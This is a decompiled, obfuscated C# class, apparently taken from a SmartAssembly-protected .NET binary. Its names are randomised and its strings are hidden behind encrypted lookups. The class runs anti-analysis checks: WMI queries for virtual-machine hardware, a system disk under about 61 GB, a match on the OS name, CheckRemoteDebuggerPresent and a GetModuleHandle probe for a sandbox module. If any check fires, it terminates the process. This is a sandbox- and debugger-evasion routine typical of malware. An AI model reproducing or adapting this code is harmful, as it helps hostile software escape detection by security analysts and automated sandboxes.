using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic.Devices;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace MeMbmuKeumkr;

internal sealed class UkrwuRkFKKVj
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void KiKqDCTiIoKo()
	{
		if (jqIhuKldjNdmCn() || BFdheMWVjXGmulA() || cAlZcWKTCBESub() || VAmeTVgnWzQuW() || oyPsPqtYoaOAog())
		{
			Process.GetCurrentProcess().Kill();
		}
		Environment.FailFast(null);
	}

	private static bool VAmeTVgnWzQuW()
	{
		try
		{
			if (new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize <= 61000000000L)
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool oyPsPqtYoaOAog()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (new ComputerInfo().get_OSFullName().ToLower().Contains(getString_0(107373379)))
			{
				return true;
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool jqIhuKldjNdmCn()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107373406));
			try
			{
				ManagementObjectCollection val2 = val.Get();
				try
				{
					ManagementObjectEnumerator enumerator = val2.GetEnumerator();
					try
					{
						while (enumerator.MoveNext())
						{
							ManagementBaseObject current = enumerator.get_Current();
							string text = current.get_Item(getString_0(107373325)).ToString()!.ToLower();
							if ((text == getString_0(107373340) && current.get_Item(getString_0(107373311)).ToString()!.ToUpperInvariant().Contains(getString_0(107373302))) || text.Contains(getString_0(107373257)) || current.get_Item(getString_0(107373311)).ToString() == getString_0(107373280))
							{
								return true;
							}
						}
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				finally
				{
					((IDisposable)val2)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
		return false;
	}

	private static bool BFdheMWVjXGmulA()
	{
		bool bool_ = false;
		try
		{
			CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref bool_);
			return bool_;
		}
		catch
		{
			return bool_;
		}
	}

	private static bool cAlZcWKTCBESub()
	{
		try
		{
			if (GetModuleHandle(getString_0(107373231)).ToInt32() != 0)
			{
				return true;
			}
			return false;
		}
		catch
		{
			return false;
		}
	}

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string string_0);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr intptr_0, ref bool bool_0);

	static UkrwuRkFKKVj()
	{
		Strings.CreateGetStringDelegate(typeof(UkrwuRkFKKVj));
	}
}
